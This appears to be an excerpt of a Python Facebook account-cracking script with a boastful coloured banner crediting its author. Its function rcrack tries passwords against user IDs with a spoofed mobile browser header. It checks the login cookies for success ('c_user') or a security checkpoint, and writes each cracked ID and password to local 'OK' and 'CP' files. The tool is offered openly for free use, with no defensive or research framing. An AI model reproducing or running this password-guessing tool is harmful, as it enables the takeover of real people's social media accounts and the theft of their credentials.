...
|/     \||/     \|   \_/   |/     \|                                  
\033[1;33m----------------------------------------------
 \033[1;37mAUTHOR    : \033[1;36mHAYA FATIMA
 \033[1;35mGITHUB    : \033[1;35mHAYA404
 \033[1;39mFACEBOOK  : \033[1;33mHAYA QUEEN
 \033[1;36mTOOL NAME : \033[1;34mRANDOM
 \033[1;35mTOOL TYPE : \033[1;37mFREE
 \033[1;32mVERSION   : \033[1;39m0.9
\033[1;33m----------------------------------------------
\033[1;34mHACKER LADKI
\033[1;31mHETARS KI MOM
\033[1;35mATTIDUTE QUEEN
\033[1;38mDAVIL CHOKRI😈
\033[1;33m----------------------------------------------""")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36,'
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HAYA-FATIMA-OK] '+cid+'|'+ps+'\033[0;97m')
                open('HAYA-FATIMA-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[HAYA-FATIMA-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HAYA-FATIMA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;99mHAYA-FATIMA\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
